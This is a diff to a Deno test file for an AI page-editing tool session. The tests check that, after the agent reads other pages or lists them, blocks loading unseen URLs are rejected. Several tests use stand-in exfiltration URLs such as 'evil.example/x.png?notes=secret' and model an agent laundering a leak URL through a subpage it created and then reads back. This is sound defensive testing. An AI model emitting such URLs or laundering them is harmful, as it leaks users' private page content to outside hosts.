@@ -468,11 +468,13 @@ Deno.test("after reading another page, blocks that load a URL use only one seen"
   assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
 
   await session.call("read_other_page", { page_id: "page-9" });
-  for (const url of ["https://example.com/here.png", "https://example.com/there.png", "https://a.example/1.png"]) {
+  for (const url of ["https://example.com/here.png", "https://example.com/there.png"]) {
     outcome = await session.call("insert_blocks", { position: end, blocks: [image(url)] });
     assert(!(outcome.result as { error?: string }).error, `${url}: ${JSON.stringify(outcome.result)}`);
   }
   const leaks: [string, Record<string, unknown>][] = [
+    // What the run wrote is not what it found, though it is on the page.
+    ["insert_blocks", { position: end, blocks: [image("https://a.example/1.png")] }],
     ["insert_blocks", { position: end, blocks: [image("https://evil.example/x.png?notes=secret")] }],
     ["insert_blocks", {
       position: end,
@@ -499,4 +501,63 @@ Deno.test("after reading another page, blocks that load a URL use only one seen"
     blocks: [{ type: "paragraph", text: "[x](https://evil.example/)" }],
   });
   assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
+});
+
+Deno.test("URLs the run wrote stay unseen when it reads them back", async () => {
+  const leak = "https://evil.example/x.png?d=secret";
+  const written = { blocks: [{ id: "b", type: "paragraph", text: `[x](${leak})` }] };
+  const reading: ToolHooks = {
+    ...hooks,
+    readOtherPage: (id) =>
+      Promise.resolve(
+        id === "private"
+          ? { blocks: [{ id: "s", type: "paragraph", text: "secret" }] }
+          // This page, as the store has it, lists the subpage the run made.
+          : id === "page-1"
+          ? { ...written, subpages: [{ id: "page-2", title: leak }] }
+          : written,
+      ),
+  };
+  const session = new PageEditSession(sample(), reading, { canEdit: true, crossPage: true, pageId: "page-1" });
+  const image = { position: { at: "end" }, blocks: [{ type: "image", image: { url: leak } }] };
+  await session.call("read_other_page", { page_id: "private" });
+  const made = await session.call("create_subpage", {
+    title: leak,
+    blocks: [{ type: "paragraph", text: `[x](${leak})` }],
+  });
+  assert(!(made.result as { error?: string }).error, JSON.stringify(made.result));
+  for (const id of ["page-2", "page-1"]) {
+    await session.call("read_other_page", { page_id: id });
+    const outcome = await session.call("insert_blocks", image);
+    assert((outcome.result as { error?: string }).error, `read back from ${id}: ${JSON.stringify(outcome.result)}`);
+  }
+});
+
+Deno.test("listing pages starts checking URLs", async () => {
+  const content = sample();
+  content.document.children!.push({ id: "img", type: "image", data: { url: "https://example.com/here.png" } });
+  const listing: ToolHooks = {
+    ...hooks,
+    listPages: () => Promise.resolve([{ id: "p", title: "Salary review", parent_id: null }]),
+  };
+  const session = new PageEditSession(content, listing, { canEdit: true, crossPage: true });
+  await session.call("list_pages", {});
+  const image = (url: string) => ({ position: { at: "end" }, blocks: [{ type: "image", image: { url } }] });
+  let outcome = await session.call("insert_blocks", image("https://evil.example/x.png?t=Salary+review"));
+  assert((outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
+  outcome = await session.call("insert_blocks", image("https://example.com/here.png"));
+  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
+});
+
+Deno.test("a replace with children: [] keeps the nested items", async () => {
+  const session = new PageEditSession(sample(), hooks, { canEdit: true, crossPage: false });
+  let outcome = await session.call("replace_block", {
+    id: "l1",
+    block: { type: "bulleted_list", text: "Renamed", children: [] },
+  });
+  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
+  assertEquals(session.content.document.children![1].children!.map((c) => c.id), ["l2"]);
+  outcome = await session.call("replace_block", { id: "l1", block: { type: "paragraph", text: "Flat", children: [] } });
+  assert((outcome.result as { error?: string }).error?.includes("nested"), JSON.stringify(outcome.result));
+  assertEquals(session.content.document.children![1].children!.map((c) => c.id), ["l2"]);
 });
